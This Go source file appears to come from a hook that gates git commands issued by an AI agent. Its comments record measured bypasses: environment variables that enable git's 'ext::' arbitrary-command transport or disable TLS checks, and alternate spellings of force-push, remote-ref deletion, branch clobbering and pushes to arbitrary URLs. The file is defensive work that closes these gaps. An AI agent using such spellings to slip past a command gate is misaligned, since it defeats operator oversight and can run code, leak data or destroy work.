// the interlock class NAMES NO PROGRAM, so `gitProgramEnvVars` — whose defining property
// is program-naming, enforced by TestGit_ProgramEnvVar_TwinIsAConfigSinkInTheRealTable —
// could not hold these without either failing that check or taking back the exception map
// pg2-h1ori deleted.
//
// THE HOLE IT CLOSES. Measured on git 2.54.0 at the hook-output boundary,
// cwd=/Users/phillipg/phillipg_mbp, mode=auto, against main @004f370c:
//
//	approve   GIT_ALLOW_PROTOCOL=ext git ls-remote 'ext::<cmd> %S'
//	approve   GIT_SSL_NO_VERIFY=1 git fetch origin
//	approve   GIT_PROTOCOL_FROM_USER=1 git ls-remote 'ext::<cmd> %S'
//	abstain   git -c protocol.ext.allow=always ls-remote 'ext::<cmd> %S'   <- the `-c` twin
//	abstain   git -c http.sslVerify=false fetch origin                     <- the `-c` twin
//	ask       git config --global protocol.ext.allow always                 <- the persistent twin
//	ask       git config --global http.sslVerify false                      <- the persistent twin
//
// So for BOTH gated interlock keys the ENV spelling was the LOOSEST of the three, which is
// the relation pg2-6c85x established for the program-naming family inverted — and
// TestGit_InterlockEnvVar_IsNeverLooserThanTheConfigSpelling now pins it.
//
// `ext::` IS GIT'S ARBITRARY-COMMAND TRANSPORT, so the first and third rows are execution,
// not merely a weakened check. Both RAN A MARKER, which is the evidence that distinguishes
// them from a plausible-looking guess:
//
//	GIT_ALLOW_PROTOCOL=ext …                                 -> marker ran as `git-upload-pack`
//	GIT_PROTOCOL_FROM_USER=1 -c protocol.ext.allow=user …    -> marker ran as `git-upload-pack`
//	(no variable)                                            -> `fatal: transport 'ext' not allowed`
//	GIT_PROTOCOL_FROM_USER=0 -c protocol.ext.allow=user …    -> `fatal: transport 'ext' not allowed`
//
// GIT_PROTOCOL_FROM_USER WAS NOT IN THE BEAD, and finding it is why the bead required the
// family be ENUMERATED rather than taken as the pair already known. It does not unlock
// anything on its own — the first probe pair above shows `=1` alone still refused — but
// under the `user` policy, which is git's default for several protocols, `=1` is exactly
// the difference between a refusal and running the command. A screen covering the two
// named variables and missing this one would have been the same family split the bead's
// governing instruction exists to prevent.
//
// THE ENUMERATION IS FROM THE BINARY'S OWN STRING TABLE, not from the man pages (this
// machine's are incomplete) — 203 `GIT_*` names in git 2.54.0, of which 14 are
// interlock-shaped. The other 11 are deliberately absent:
//
//   - `clean.requireForce` and `receive.denyCurrentBranch`, the two remaining
//     configInterlock keys, HAVE NO ENV TWIN AT ALL — confirmed against that same string
//     table. So this table covers every gated interlock key that has an env spelling.
//   - MORE RESTRICTIVE, so screening them would be a pure false positive:
//     `GIT_TERMINAL_PROMPT=0` (suppresses prompting), `GIT_NO_REPLACE_OBJECTS`
//     (DISABLES replace refs, which are the hazard), `GIT_NO_LAZY_FETCH`.
//   - NOT A REFUSAL AT ALL: `GIT_FORCE_THREADS`, `GIT_FORCE_UNTRACKED_CACHE`,
//     `GIT_SHALLOW_FILE`, `GIT_TRACE_SHALLOW`, `GIT_TEST_DISALLOW_ABBREVIATED_OPTIONS`.
//   - `GIT_CONFIG_NOSYSTEM` is already screened by the `GIT_CONFIG_` prefix
//     (hasGitConfigEnvInjection) and measured `abstain`, so it needs no entry here.
//   - `GIT_ALLOW_NULL_SHA1` and `GIT_ATTR_NOSYSTEM` ARE interlock-shaped and are
//     deliberately NOT screened: their config twins (`fsck.<msg-id>` and the
//     gitattributes search path) are NOT IN gatedConfigKeys, so screening the env half
//     alone would split a family across two routes — the exact thing this bead exists to
//     avoid. Gating those keys is its own survey, its own ruling and its own replay.
//     Recorded here rather than omitted so the next reader inherits the enumeration.
//
// IT IS VALUE-BLIND, matching every entry of gitProgramEnvVars outside the editor
// carve-out, and the cost is stated rather than hidden: a STRICTLY MORE RESTRICTIVE
// assignment is screened too — `GIT_SSL_NO_VERIFY=0`, an empty `GIT_ALLOW_PROTOCOL=`
// (which allows NOTHING), `GIT_PROTOCOL_FROM_USER=0`. That is a knowingly accepted false
// positive in the safe direction. Reading the value would mean re-deriving git's own
// boolean and colon-list parsing for three variables whose entire corpus presence is 21
// rows, every one of which is a probe script or a bead body rather than a real
// invocation (verified, not assumed — see the bead's replay note).
var gitInterlockEnvVars = map[string]string{
	"GIT_ALLOW_PROTOCOL":     "protocol.allow",
	"GIT_PROTOCOL_FROM_USER": "protocol.allow",
	"GIT_SSL_NO_VERIFY":      "http.sslVerify",
}

// hasGitInterlockEnvVar reports whether this leaf's own env-assignment prefix carries a
// variable through which a refusal git makes by default is REMOVED. See
// gitInterlockEnvVars for the measured variable-by-variable evidence, for the complete
// enumeration behind it, and for why it is value-blind.
func hasGitInterlockEnvVar(envs []cmdparse.EnvAssignment) bool {
	for _, ev := range envs {
		if _, screened := gitInterlockEnvVars[ev.Name]; screened {
			return true
		}
	}
	return false
}

// hasSequenceEditorEnvVar reports whether the rebase arm's editor REQUIREMENT is satisfied.
//
// IT IS THE ONE ENV PREDICATE IN THIS FILE THAT STAYS LEAF-LOCAL, and pg2-xjt1s left it
// that way on purpose. The other three are SCREENS: widening them to the visible
// environment can only make a verdict more restrictive. This one is a REQUIREMENT, so
// widening it would APPROVE something that abstains today — `export GIT_SEQUENCE_EDITOR=:;
// git rebase -i main` measures `{}` on main @ a064a73e and would become `allow`. That is a
// relaxation, it needs its own ruling and its own replay, and it is the same residual
// asymmetry isInertEditorValue already records for the argv twin.
func hasSequenceEditorEnvVar(pc cmdparse.ParsedCommand) bool {
	for _, ev := range pc.EnvVars {
		if ev.Name == "GIT_SEQUENCE_EDITOR" {
			return true
		}
	}
	return false
}

// isBranchUnsafe reports whether a `git branch` invocation is one from which GIT'S
// OWN GUARD has been removed. It holds the WHOLE `git branch` policy; the branch arm
// in classify is only the verdict it feeds.
//
// THE VERDICT IS BY SAFETY, NOT BY FLAG — operator ruling of 2026-07-31, recorded as
// pg2-4yy4r item 5 and implemented by pg2-fkmg4: "abstain for any spelling which is
// unsafe, approve any which is safe". That SUPERSEDES the narrower "`git branch -D` →
// Ask" ruling and, with it, the force-DELETE conjunction pg2-os1kq's widening put
// here (isBranchForceDelete, folded into this predicate and deleted).
//
// THE BOUNDARY IS GIT'S, NOT OURS, which is what makes this predicate short. `git
// branch -h` states it outright:
//
//	-d, --[no-]delete   delete fully merged branch           GUARDED
//	-D                  delete branch (even if not merged)   = -d FUSED with --force
//	-m, --[no-]move     move/rename a branch and its reflog  GUARDED
//	-M                  move/rename, even if target exists   = -m FUSED with --force
//	-c, --[no-]copy     copy a branch and its reflog         GUARDED
//	-C                  copy, even if target exists          = -c FUSED with --force
//	-f, --[no-]force    force creation, move/rename, deletion
//
// The LOWERCASE forms are GUARDED: git itself refuses the destructive case, so they
// are not this rule's business and keep their Approve. The UPPERCASE forms ARE the
// guarded form fused with --force, and an explicit -f/--force removes the guard from
// any of them. So "is it unsafe" is exactly "is the guard gone" — three fused letters,
// plus force in any spelling.
//
// `-D` WAS NEVER THE REAL SURFACE, which is the finding that motivated the ruling.
// Measured 2026-07-31 in throwaway repos: `git branch -M old keepme` CLOBBERED the
// existing target, `keepme` going bdfdb1f -> bad17ef, and `git branch -C a keepme`
// overwrote an existing branch — both `allow` before this change. Their guarded twins
// held: `-m old keepme` answered "fatal: a branch named 'keepme' already exists" and
// `-d unmerged` answered "error: the branch 'unmerged' is not fully merged".
//
// `-f` ALONE IS NOW GATED, REVERSING WHAT THIS FILE USED TO SAY, and this is the one
// verdict that moves from Approve for a spelling no earlier bead thought destructive.
// isBranchForceDelete's doc recorded `git branch -f <name> <start>` as "a force-MOVE/
// create, no delete at all … Gating `-f` alone would gate that, so it is deliberately
// not gated". Force CREATION silently MOVES an EXISTING branch ref, which is the same
// lost tip under another name, and the tokens alone cannot say whether <name> already
// exists — so the guard-removed reading is the only one available from the command
// line, and the ruling gates it.
//
// MEASURED, git 2.54.0, throwaway repo, 2026-08-12, with `keepme` at 82cd0ea and
// `probe` at 6eeb755:
//
//	git branch keepme probe      -> "fatal: a branch named 'keepme' already exists"
//	                                (the guard; keepme untouched)
//	git branch -f keepme probe   -> accepted, and keepme MOVED 82cd0ea -> 6eeb755
//
// One flag, and the same command goes from a refusal to a silent ref rewrite. Nothing
// in the argv distinguishes the two, which is the whole reason `-f` cannot be read as
// "just a creation".
//
// WHY ABSTAIN AND NOT ASK, AND THE CONSEQUENCE THE OPERATOR ACCEPTED. Abstain emits
// `{}` (hookio.FormatOutput), so an unsafe `git branch` PROMPTS in `default` mode and
// is AUTO-APPROVED in an auto-approving mode. The operator accepted that explicitly,
// consistent with the same ruling for `git clean` (pg2-u0e0c) and `git reset --hard`
// (pg2-ur9zc), on the mitigation that a deleted or clobbered branch TIP stays
// reachable through the reflog for gc.reflogExpire (90 days by default) — materially
// less final than `git clean -fdx`. Raising this to Ask or Reject would contradict
// that ruling and needs a new one.
//
// THE `--no-` TRAP, AND WHY IT NEEDED NO NEW HELPER. `git branch -h` spells the long
// forms `--[no-]force` / `--[no-]delete` / `--[no-]move` / `--[no-]copy`, so
// `--no-force` is a REAL spelling and MUST NOT read as force. cmdparse.HasLongFlag
// documents that it covers no negation, and a hand-rolled `strings.HasPrefix(tok,
// "--f")` predicate would have had to exclude them by hand — which is the trap. The
// matcher used here does not: cmdparse.HasLongFlagPrefix never matches a token LONGER
// than its canonical, and "no-force" is longer than "force", so every negation is
// excluded BY CONSTRUCTION. That is why no sibling of HasLongFlag was added.
//
// AND THE NEGATION REALLY IS THE OPPOSITE, measured on git 2.54.0, 2026-08-12 in the
// same repo as above: `git branch --no-force newname probe` was accepted (so it IS a
// spelling git parses), while `git branch --no-force keepme <other>` answered "fatal: a
// branch named 'keepme' already exists" — the guard git had just skipped for `-f` was
// back. Reading `--no-force` as force would gate the STRICTER of the two commands.
//
// CASE IS SIGNIFICANT, an explicit acceptance criterion: `-d`/`-D`, `-m`/`-M` and
// `-c`/`-C` differ in meaning, and cmdparse.HasShortFlag compares BYTES, so no folding
// can happen. `-F` is not a `git branch` option at all and is not `--force`.
//
// POSITION DOES NOT MATTER — every token is scanned, so a flag written AFTER the
// operand (`git branch foo -D`) is still seen — and the `--` END-OF-OPTIONS TERMINATOR
// IS RESPECTED, because both cmdparse matchers stop there: `git branch -- -D` is a
// branch NAMED `-D` and stays approvable.
//
// THE LONG HALF USES cmdparse.HasLongFlagPrefix rather than a measured minimum, per
// the rule recorded on hasAbbrevLongFlag: this is a BOOLEAN dangerous-flag test, so
// over-matching only moves the verdict toward Abstain. It does over-match — real git
// answers `error: ambiguous option: f (could be --force or --format)` for
// `git branch --d --f <b>` (measured 2026-07-30, recorded by pg2-os1kq), which this
// gates anyway — and that is the fail-safe direction. `--format=…` cannot be mistaken
// for `--force`: "format" is longer than "force", and HasLongFlagPrefix never matches a
// longer token against a shorter canonical, which is also what keeps the `--no-`
// negations out.
//
// SCOPE IS `git branch` ONLY. The operator stated the principle generally, but ruled
// it only here. Several other git subcommands still get ONE blanket verdict regardless
// of flags (`git clean` is the documented example), and widening the principle to them
// is its own bead and its own ruling — pg2-fkmg4 says so in terms. Do not generalise
// this predicate.
func isBranchUnsafe(args []string) bool {
	shorts := branchShortFlagTokens(args)
	// The FUSED forms: a guarded operation with --force baked into the one letter, in
	// any cluster position (`-D`, `-Dv`, `-vM`, `-rC`).
	if cmdparse.HasShortFlag(shorts, 'D') || cmdparse.HasShortFlag(shorts, 'M') || cmdparse.HasShortFlag(shorts, 'C') {
		return true
	}
	// An EXPLICIT force removes the guard from delete, move, copy AND creation, so it
	// is unsafe ON ITS OWN. NO CONJUNCTION with a delete/move/copy half is required,
	// and requiring one is precisely what let `-M`, `-C`, `-f`, `-m -f` and `-c -f`
	// through before pg2-fkmg4 — a conjunction can only ever gate the pairs someone
	// remembered to enumerate.
	return cmdparse.HasShortFlag(shorts, 'f') || cmdparse.HasLongFlagPrefix(args, "force")
}

// branchShortFlagTokens returns args with every short-flag cluster truncated at its
// first VALUE-TAKING letter — `git branch`'s `-u <upstream>` and `-t[=<mode>]`, the
// only two shorts of that subcommand which accept a GLUED value. Measured on git
// 2.54.0, 2026-07-30: `git branch -uorigin/main` answered "the requested upstream
// branch 'origin/main' does not exist" and `-tdirect` was accepted, while `-mzz` and
// `-czz` both answered "unknown switch `z'" — so `-m` and `-c` need no truncation.
//
// WITHOUT THIS, AN UPSTREAM OR BRANCH NAME MANUFACTURES A VERDICT. Everything after
// the value-taking letter is the option's VALUE, not more flag letters, yet a cluster
// scan reads it as letters. The false-positive surface GREW when pg2-fkmg4 widened the
// predicate from force-delete to every unguarded spelling, because it now asks about
// four letters instead of two: `-uorigin/DEV` carries a `D`, `-uorigin/MAIN` an `M`,
// `-uorigin/CI` a `C`, and `-uorigin/feature-docs` an `f` — each a false verdict on its
// own, with no second half needed. This is the same false-positive class pg2-5b901
// records, arrived at through flag arity instead of command text, and the same reason
// pushShortFlagTokens exists for `git push -o <opt>`. cmdparse.HasShortFlag documents
// that it models no arity and pushes exactly this question to its caller.
//
// TRUNCATION IS LOSSLESS, measured the same day: `-tD` answers "option `--track'
// expects \"direct\" or \"inherit\"" and `-uD` answers "the requested upstream branch
// 'D' does not exist" — neither deletes anything, because there the `D` IS the
// option's value — while `-Dt` and `-Dft` DO delete and carry their `D` BEFORE the
// truncation point, so both survive. The same reading covers the letters pg2-fkmg4
// added: after `-t` or `-u` an `M`, `C` or `f` is that option's VALUE (a track mode git
// refuses, or an upstream branch name), so nothing that really moves, copies or forces
// is lost, while `-Mt`, `-Cf` and `-fu` carry their letter before the truncation point.
//
// `--`, long flags and a lone `-` are returned untouched so HasShortFlag's own
// end-of-options and operand handling still applies.
func branchShortFlagTokens(args []string) []string {
	out := make([]string, len(args))
	for i, a := range args {
		if len(a) > 1 && a[0] == '-' && a[1] != '-' {
			if v := strings.IndexAny(a, "ut"); v > 0 {
				a = a[:v] // drop the value-taking letter and everything after it
			}
		}
		out[i] = a
	}
	return out
}

// Long-flag ABBREVIATION MINIMUM for the ONE `git push` option pushVerdict reads a
// VALUE from. git's parse-options accepts any UNAMBIGUOUS PREFIX of a long option,
// so `--rep=<url>` is a real spelling of `--repo=<url>`.
//
// The value is the SHORTEST prefix real git accepted, MEASURED with `git push
// <spelling> origin main` against git 2.54.0 on 2026-07-30; one character shorter,
// git answered `error: ambiguous option`. Re-measure before changing it.
//
// ONLY `--repo` IS LEFT HERE (pg2-os1kq). `--force`, `--force-with-lease`,
// `--mirror` and `--delete` had measured minimums too — `len("force")`,
// `len("force-w")`, `len("m")` and `len("de")`, each re-confirmed on git 2.54.0,
// 2026-07-30 — and every one of them has moved to cmdparse.HasLongFlagPrefix. Those
// four are BOOLEAN dangerous-flag tests whose only effect is to make the verdict
// more restrictive, so a measured bound buys nothing and COSTS the thing this bead
// is about: a minimum is a property of git's option table AT MEASUREMENT TIME, not
// of this code, so `--forc` is safe today only because it is ambiguous with
// --force-if-includes, and the day git retires that option `--forc` becomes a live
// force-push this rule would approve. `--repo` keeps its minimum because its
// `=`-glued VALUE is read and used as the push destination; see hasAbbrevLongFlag
// for the rule that decides between the two matchers.
const minAbbrevRepo = len("rep") // `--re` is ambiguous: --recurse-submodules / --receive-pack

// hasAbbrevLongFlag reports whether args carries long flag name in any spelling
// git would accept — the full name, or an unambiguous prefix down to minLen
// characters — and returns the value of the `=`-glued form (see
// cmdparse.HasLongFlag for what an empty value means). It asks
// cmdparse.HasLongFlag once per candidate spelling, LONGEST FIRST, so the glued
// value is read from the longest spelling actually present.
//
// A `--no-<name>` token does not match, which is correct: `--no-force` turns
// force off.
//
// minLen is per SUBCOMMAND, not per flag name: what a prefix is ambiguous with
// depends on which option table git parsed the command against. The measured
// minimums live beside the subcommand that needs them — see minAbbrevRepo for
// `git push` and the `git config` block (minAbbrevUnset and its neighbours) — and
// this helper holds none of its own.
//
// # WHICH MATCHER TO USE (pg2-os1kq) — the rule, so the next author does not guess
//
// Two abbreviation matchers now exist and they are NOT interchangeable. Both are
// prefix-aware; they differ in whether the prefix is BOUNDED by a measured
// minimum. The test is what a MATCH is used for, not which flag it is:
//
//   - cmdparse.HasLongFlagPrefix — an OPEN prefix, no minimum — is the DEFAULT, and
//     MUST be used for a BOOLEAN DANGEROUS-FLAG TEST: one whose only effect is to
//     move the verdict toward Ask or Reject. Over-matching is then fail-safe by
//     construction (a spelling git would refuse as ambiguous is refused here
//     instead), and the caller stops depending on git's current option table. Every
//     `git push` force / --mirror / --delete / --force-with-lease gate, the `reset`
//     `--hard` gate and the `rebase` `--interactive` gate are this shape.
//   - hasAbbrevLongFlag — a MEASURED minimum — MUST be used where the match's
//     LENGTH or the flag's VALUE is load-bearing, because over-matching there has no
//     safe direction. Two call sites qualify and they are the only ones:
//     pushNetworkDestination's `--repo`, whose `=`-glued VALUE becomes the
//     destination the gate rules on; and every `git config` option
//     (configWriteFlags, and configIsValueLongFlag's own bounded loop over
//     configValueFlags), where a match ELIDES a token and so shifts the operand
//     count configIsRead's read/write bound and gatedConfigKey's key scan both
//     depend on. A blanket switch to the open matcher there could mis-elide and
//     silently change a `git config` verdict.
//
// A NEW long-flag test MUST pick by that rule and is checked mechanically:
// TestGit_LongFlagTests_AreAbbreviationAware in flagmatch_test.go walks this file's
// AST and fails any exact-token long-flag test outside its named exemptions, and
// pins each gated flag to the matcher chosen above.
func hasAbbrevLongFlag(args []string, name string, minLen int) (string, bool) {
	for n := len(name); n >= minLen; n-- {
		if v, ok := cmdparse.HasLongFlag(args, name[:n]); ok {
			return v, true
		}
	}
	return "", false
}

// pushShortFlagTokens returns args with every short-flag cluster truncated at
// its first `o` — `git push`'s ONLY short option that takes a value (`-o <opt>`,
// and glued as `-oci.skip`, measured accepted on git 2.54.0). Everything after
// that `o` is the option's VALUE, not more flag letters, so scanning it would let
// a value that happens to contain `f` or `d` (`-oconfidential`) manufacture a
// false force/delete Reject — the same false-positive class pg2-5b901 records,
// arrived at through flag arity instead of command text. cmdparse.HasShortFlag
// documents that it knows no arity and pushes exactly this question to its
// caller.
//
// `--`, long flags and a lone `-` are returned untouched so HasShortFlag's own
// end-of-options and operand handling still applies.
func pushShortFlagTokens(args []string) []string {
	out := make([]string, len(args))
	for i, a := range args {
		if len(a) > 1 && a[0] == '-' && a[1] != '-' {
			if o := strings.IndexByte(a, 'o'); o > 0 {
				a = a[:o]
			}
		}
		out[i] = a
	}
	return out
}

// hasNetworkScheme reports whether tok is an explicit `<scheme>://…` URL naming a
// destination that is NOT on this filesystem.
//
// The scheme is matched GENERICALLY rather than against an allowlist, so
// `https`, `http`, `git`, `ssh` and the historical `git+ssh` / `ssh+git` forms are
// all covered, as is any scheme a future git learns — an allowlist would silently
// exempt whatever it omitted, which for a security gate is the wrong default.
//
// `file://` is the ONE exemption and it is deliberate: it names a path on this
// filesystem, so it has the local-path properties described in
// pushDestinationOffMachine, not the network ones. Matched case-insensitively
// because git accepts the scheme in any case.
func hasNetworkScheme(tok string) bool {
	i := strings.Index(tok, "://")
	if i <= 0 { // `i == 0` is "://…" with no scheme at all, not a URL
		return false
	}
	return !strings.EqualFold(tok[:i], "file")
}

// isScpLikeURL reports whether tok is git's scp-like ssh syntax,
// `[user@]host:path` — a NETWORK destination reached over ssh (measured
// 2026-07-30: `GIT_SSH_COMMAND=… git push git@example.invalid:evil/x.git main`
// invoked the ssh command, so this shape really does leave the machine).
//
// The test is git's own: a `:` that appears before any `/`. A token carrying an
// explicit `<scheme>://` is excluded first, because otherwise `file:///tmp/x`
// would match here (its first `:` precedes its first `/`) and defeat
// hasNetworkScheme's file exemption.
//
// POSITION IS LOAD-BEARING. This shape is indistinguishable from a `src:dst`
// REFSPEC (`main:other` reads as host `main`, path `other`), so it MUST be tested
// only at the DESTINATION operand position, where git itself resolves it as a
// URL. pushNetworkDestination never applies it to a later operand.
func isScpLikeURL(tok string) bool {
	if strings.Contains(tok, "://") {
		return false // an explicit scheme; hasNetworkScheme owns this token
	}
	c := strings.IndexByte(tok, ':')
	if c <= 0 {
		return false
	}
	if s := strings.IndexByte(tok, '/'); s >= 0 && s < c {
		return false // a path like /tmp/a:b — the colon is inside the path
	}
	return true
}

// pushDestinationOffMachine reports whether a `git push` DESTINATION token names
// a host other than this machine.
//
// WHAT IS DELIBERATELY NOT MATCHED — and this is the regression-critical half.
// Everything else falls through unchanged, which collapses two very different
// spellings into one ungated class ON PURPOSE:
//
//   - A configured remote NAME (`origin`, `upstream`). Ungated because gating it
//     is the whole verdict this rule already grants.
//   - A LOCAL FILESYSTEM PATH (`/tmp/dst.git`, `./dst.git`, `../dst.git`,
//     `~/dst.git`, `sub/dir`, and `file://…`). Ungated DELIBERATELY, for three
//     reasons: (1) the exfiltration rationale that makes the network form a
//     Reject does not apply — the objects never leave the filesystem; (2) whether
//     a given directory may be WRITTEN is already patheval's question, asked by
//     chdirSafe, not this rule's; (3) pushing between throwaway local repos is
//     how the evidence in this very rule was measured (pg2-bohpm's
//     --force-with-lease reproduction), so gating it would break the project's
//     own fixtures and legitimate local work.
//
// A bare name can carry neither a `://` nor a pre-slash `:`, and a local path
// carries a `/` before any `:`, so neither predicate can reach them.
func pushDestinationOffMachine(tok string) bool {
	return hasNetworkScheme(tok) || isScpLikeURL(tok)
}

// pushNetworkDestination returns the token by which a `git push` names a NETWORK
// destination, and true when it does. refspecs is pushVerdict's already-computed
// cmdparse.ClassifyPushRefspecs(rest), i.e. every operand AFTER the destination.
//
// It reads three places, because git accepts the destination in three:
//
//  1. The DESTINATION OPERAND (`git push <url> main`) — cmdparse.FirstOperand,
//     which for `git push` is the repository, not a refspec. Both shapes are
//     tested here, the only position where scp-like is unambiguous.
//  2. `--repo=<url>`, which git documents as equivalent to the operand. Only the
//     GLUED value needs its own read: in the SEPARATED form (`--repo <url>`) the
//     value is already what FirstOperand returns, by the separated-value shift
//     that primitive documents — so case 1 catches it.
//  3. Any LATER operand carrying `://`. This exists to close that same shift in
//     the other direction: `git push -o ci.skip <url> main` makes FirstOperand
//     answer `ci.skip`, moving the URL into refspec position. Only the `://` test
//     is applied here, never scp-like, because a refspec legitimately looks
//     scp-like (`main:other`) whereas `://` is not a valid ref name in any
//     position.
func pushNetworkDestination(rest []string, refspecs []cmdparse.Refspec) (string, bool) {
	if dest, _ := cmdparse.FirstOperand(rest); dest != "" && pushDestinationOffMachine(dest) {
		return dest, true
	}
	if v, ok := hasAbbrevLongFlag(rest, "repo", minAbbrevRepo); ok && v != "" && pushDestinationOffMachine(v) {
		return v, true
	}
	for _, rs := range refspecs {
		if hasNetworkScheme(rs.Raw) {
			return rs.Raw, true
		}
	}
	return "", false
}

// pushVerdict returns the verdict for a `git push` — rest being the args AFTER
// the `push` subcommand — and false when the push is none of the prohibited
// shapes, in which case classify lets it fall through to the ordinary modifying
// Approve.
//
// WHY REJECT AND NOT ASK. Operator ruling, 2026-07-30: an agent must never
// force-push. Until pg2-bohpm the rule matched `--force`/`-f` by exact token
// equality, so every other spelling of the SAME operation reached
// modifyingSubcommands["push"] and was approved outright — measured `allow` for
// `git push origin +main`, `git push origin :main`, `git push
// --force-with-lease=other origin main:other` and `git push -fu origin main`.
// Ask cannot implement that ruling: it asks a person a question the ruling has
// already answered, and an Ask on the two visible spellings beside four silent
// approvals teaches its own bypass — the agent is told "--force is prohibited"
// and retries with `+main`. Reject hands the reason back to the agent and leaves
// no approvable spelling of the operation.
//
// WHAT WOULD JUSTIFY CHANGING IT: a new operator ruling. Needing one force push
// is not one — publishing is operator-authorized anyway, so the operator can run
// it themselves; relaxing any of these to Ask requires the ruling to change.
//
// A NETWORK DESTINATION IS ALSO REJECT (pg2-abb65, 2026-07-30). `git push` takes
// a URL in place of a remote NAME, so before this gate `git push
// https://example.invalid/x.git main` measured `allow`: an agent could send any
// branch to any host, with no prompt, WITHOUT mutating `git remote` at all.
//
// REJECT RATHER THAN ASK, and the deciding argument is RELATIVE STRINGENCY, not
// severity in the abstract. `git remote set-url` / `git remote add` are gated for
// exactly this exfiltration rationale — a remote mutation silently redirects
// where pushes land. Push-to-URL is the SAME vector with strictly fewer steps and
// no persistent trace. An Ask here would therefore sit BELOW the control it is
// meant to match: an agent refused the config mutation would simply push straight
// to the URL and meet a prompt instead of a refusal, which closes the slow door
// and leaves the fast one ajar. That inversion is the whole defect, so the gate
// has to be at least as strict as the control it mirrors. Reject also leaves no
// approvable spelling, which is the property that stops the "try the next
// spelling" loop the force-push Rejects above were written to stop.
//
// THE COST OF REJECT IS NEAR ZERO HERE, which is what makes it proportionate: an
// agent must not publish on its own initiative in the first place, so it has no
// sanctioned reason to reach an arbitrary host. The remedies are both open —
// configure a remote and push by NAME (which puts a person in the loop at the
// `git remote` gate), or hand the push to the operator.
//
// LOCAL PATHS ARE NOT GATED. See pushDestinationOffMachine for the reasoning and
// for why `file://` counts as local rather than as a URL.
//
// EVERY LONG FLAG BELOW IS MATCHED BY OPEN PREFIX (pg2-os1kq), not by a measured
// abbreviation minimum. The verdicts are unchanged for every spelling git actually
// accepts — re-measured on git 2.54.0, 2026-07-30, the minimums pg2-bohpm recorded
// were correct — so this is not a bug fix here but the removal of a DEPENDENCY: a
// minimum encodes git's option table at measurement time, so `--forc` is refused by
// git today only because it is ambiguous with --force-if-includes, and retiring that
// option would turn `--forc` into a live force-push this rule approved. The open
// matcher now refuses `--forc`, `--for`, `--fo` and `--f` itself. `--repo` is the one
// exception and keeps its minimum, because its VALUE is read; see hasAbbrevLongFlag.
//
// A LONGER flag never matches a shorter canonical, so `--force-with-lease` still
// reaches its own block below rather than the force Reject above, and the two gates
// keep their separate, differently-worded reasons.
//
// TEXT VS PARSED: every test here reads PARSED tokens (post-unquote
// cmdparse.ParsedCommand.Args) and the rule runs only when
// isGitExecutable(pc.Executable), so `--force` inside a commit message, a
// heredoc body or a `bd comment` body is TEXT and never matches. That is the
// pg2-5b901 failure mode this deliberately avoids; do not reintroduce a
// strings.Contains over command text.
func (r *Rule) pushVerdict(rest []string) (hookio.RuleResult, bool) {
	reject := func(reason string) (hookio.RuleResult, bool) {
		return hookio.RuleResult{Decision: hookio.Reject, Reason: reason, Module: r.Name()}, true
	}
	shorts := pushShortFlagTokens(rest)
	refspecs := cmdparse.ClassifyPushRefspecs(rest)

	// FORCE — the ruling itself. All three spellings are the same operation: the
	// `+` refspec prefix forces just that refspec, and `-f`/`--force` force every
	// one. ClassifyPushRefspecs deliberately does not reflect the flags, and
	// HasShortFlag deliberately does not match longs, so all three are asked.
	if cmdparse.HasLongFlagPrefix(rest, "force") {
		return reject("git: force-push is prohibited — an agent must never force-push (operator ruling 2026-07-30). Every spelling is refused (--force, -f, a clustered -f…, and a '+' refspec prefix), so retrying with another one will not work; use --force-with-lease on the SAME branch, or hand the push to the operator")
	}
	if cmdparse.HasShortFlag(shorts, 'f') {
		return reject("git: force-push is prohibited — -f is --force (operator ruling 2026-07-30). Every spelling is refused, including a clustered -f… such as -fu and a '+' refspec prefix; use --force-with-lease on the SAME branch, or hand the push to the operator")
	}
	for _, rs := range refspecs {
		if rs.Force {
			return reject("git: force-push is prohibited — the '+' prefix in refspec " + rs.Raw + " IS a force (operator ruling 2026-07-30). Drop the '+'; if the push then fails as non-fast-forward, rebase, or use --force-with-lease on the SAME branch")
		}
	}

	// --mirror deletes every remote ref that is absent locally, so it is a
	// remote-ref delete of unbounded width — strictly broader than the
	// single-branch delete below, and never a legitimate agent operation here.
	if cmdparse.HasLongFlagPrefix(rest, "mirror") {
		return reject("git: git push --mirror is prohibited — it DELETES every remote ref absent locally, an unbounded remote-ref deletion (pg2-bohpm, 2026-07-30). Push the one ref you mean by name")
	}

	// REMOTE-REF DELETE. Not force-push, so outside the literal ruling, but it
	// destroys a remote ref, which for another clone may be the only copy, and
	// nothing an agent can do restores it. Rejected for the same reason the flag
	// spellings are: pinning only the `:main` refspec form and leaving `--delete`
	// open would teach the flag form as the bypass. Both are the same operation.
	// Revisiting this needs an operator ruling on remote-ref deletion, not a
	// workflow that finds it inconvenient — deleting a merged remote branch is
	// the platform's job (GitHub does it on merge), not a push's.
	if cmdparse.HasLongFlagPrefix(rest, "delete") {
		return reject("git: deleting a remote ref is prohibited — --delete destroys a ref that may be another clone's only copy (pg2-bohpm, 2026-07-30). Every spelling is refused (--delete, -d, and a ':ref' refspec); let the platform delete a merged branch, or hand it to the operator")
	}
	if cmdparse.HasShortFlag(shorts, 'd') {
		return reject("git: deleting a remote ref is prohibited — -d is --delete (pg2-bohpm, 2026-07-30). Every spelling is refused; let the platform delete a merged branch, or hand it to the operator")
	}
	for _, rs := range refspecs {
		if rs.Delete {
			return reject("git: deleting a remote ref is prohibited — the empty source in refspec " + rs.Raw + " IS a delete (pg2-bohpm, 2026-07-30). Every spelling is refused; let the platform delete a merged branch, or hand it to the operator")
		}
	}

	// NETWORK DESTINATION (pg2-abb65). See this function's doc comment for the
	// Reject-not-Ask ruling and pushDestinationOffMachine for what counts.
	//
	// ORDER IS LOAD-BEARING, IN BOTH DIRECTIONS.
	//
	// AFTER the force / --mirror / --delete Rejects above: those are prohibited
	// OPERATIONS whatever the destination, and their reasons name the operation and
	// its remedy. Reaching them first leaves every pg2-bohpm verdict and reason
	// string byte-identical, so a `--force` to a URL still reads as a force-push
	// refusal — the accurate answer, since dropping the URL would not make it
	// approvable.
	//
	// BEFORE the --force-with-lease block below, which is not optional. That block
	// returns an ASK for a same-branch lease to any remote that is not `origin`,
	// and a URL is by definition not `origin` — so placed after it, this gate would
	// be SHADOWED for every `--force-with-lease <url> main` and the URL form would
	// silently DOWNGRADE from Reject to Ask (measured on the pre-fix binary: `git
	// push --force-with-lease https://example.invalid/x.git main` answered `ask`
	// from that very branch). Ordering it first makes the two gates disjoint in
	// practice: the non-origin Ask now only ever sees a NAMED remote, which is what
	// it was written for.
	if dest, ok := pushNetworkDestination(rest, refspecs); ok {
